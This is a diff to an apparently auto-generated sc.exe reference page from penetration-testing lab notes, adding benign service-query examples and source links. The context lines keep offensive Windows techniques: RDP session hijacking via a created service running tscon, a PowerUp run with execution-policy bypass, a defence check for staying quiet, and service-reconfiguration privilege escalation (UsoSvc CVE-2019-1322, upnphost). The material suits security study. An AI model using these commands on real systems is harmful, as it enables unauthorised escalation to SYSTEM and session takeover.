@@ -9,6 +9,48 @@ hideFooterPagination: true
 
 {/* Generated from Commands/sc.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## sc.exe: choose the operation and read the result
+
+Query Windows service state, configuration and its security descriptor.
+
+### What the result establishes
+
+Separate querying service configuration/security from changing or starting the service.
+
+### Prerequisites and common failures
+
+Use sc.exe in PowerShell to avoid aliases; service-control rights and permission to edit the executable are independent.
+
+### Example 1: List services
+
+Run in: **Windows — cmd.exe or PowerShell**. Keep the space after state=.
+
+```cmd
+sc.exe query state= all
+```
+
+### Example 2: Inspect service configuration
+
+Run in: **Windows — cmd.exe or PowerShell**. BINARY_PATH_NAME is the command line; SERVICE_START_NAME is the service account.
+
+```cmd
+sc.exe qc SERVICE_NAME
+```
+
+### Example 3: Read service permissions
+
+Run in: **Windows — cmd.exe or PowerShell**. Displays SDDL for the service object; the binary file has separate permissions.
+
+```cmd
+sc.exe sdshow SERVICE_NAME
+```
+
+**sc behaves like a file-writing command in PowerShell** — Use sc.exe explicitly. In Windows PowerShell, sc can resolve to the Set-Content alias.
+
+## Saved commands and notebook recipes
+
+Query Windows service state, configuration and its security descriptor.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=sc) · [All tools](/index)
@@ -77,6 +119,13 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 PowerShell session displaying user queries and service creation command with success message.
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking RDP: Module Notes — RDP Session Hijacking](/modules/common-services/rdp#rdp-session-hijacking)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```cmd
@@ -91,6 +140,13 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 [SC] CreateService SUCCESS
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — RDP Session Hijacking](/modules/common-services/full-reference#rdp-session-hijacking)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="3. Checking Defenses">
@@ -102,6 +158,13 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 ```cmd
 sc query windefend
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 3. Checking Defenses](/active-directory/living-off-the-land#3-checking-defenses)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -116,6 +179,13 @@ sc query windefend                           :: Defender running?
 Get-MpComputerStatus | ft RealTimeProtection*, AMSIEnabled    (PowerShell)
 netsh advfirewall show allprofiles
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Defenses present (decide if you need to be quiet)](/cheatsheets/windows-post-exploitation#defenses-present-decide-if-you-need-to-be-quiet)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -132,6 +202,13 @@ sc stop <service> & sc start <service>
 :: PowerUp automates discovery + abuse:
 powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — E. Service & path abuse (normal-user → SYSTEM)](/cheatsheets/windows-post-exploitation#e-service-&-path-abuse-normal-user-→-system)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -152,6 +229,13 @@ FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
 FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Incorrect permissions in services](/privesc/windows-privesc-checklist#eop-incorrect-permissions-in-services)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="EoP - Processes Enumeration and Tasks">
@@ -168,6 +252,13 @@ Get-Service
 Get-Process
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -199,6 +290,13 @@ SERVICE_NAME: usosvc
 PS C:\Windows\system32> sc.exe start UsoSvc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows 10 - CVE-2019-1322 UsoSvc](/privesc/windows-privesc-checklist#example-with-windows-10-cve-2019-1322-usosvc)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Example with Windows XP SP1 - upnphost">
@@ -216,6 +314,13 @@ sc config upnphost depend= ""
 net start upnphost
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -226,6 +331,13 @@ net start upnphost
 
 sc config upnphost depend=""
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Windows Privilege Escalation: Full Checklist**
 
@@ -256,6 +368,21 @@ $ sc stop <vuln-service>
 $ sc start <vuln-service>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Windows Privilege Escalation: Full Checklist](/privesc/windows-privesc-checklist)
+
+{/* VAULT_RELATED_END */}
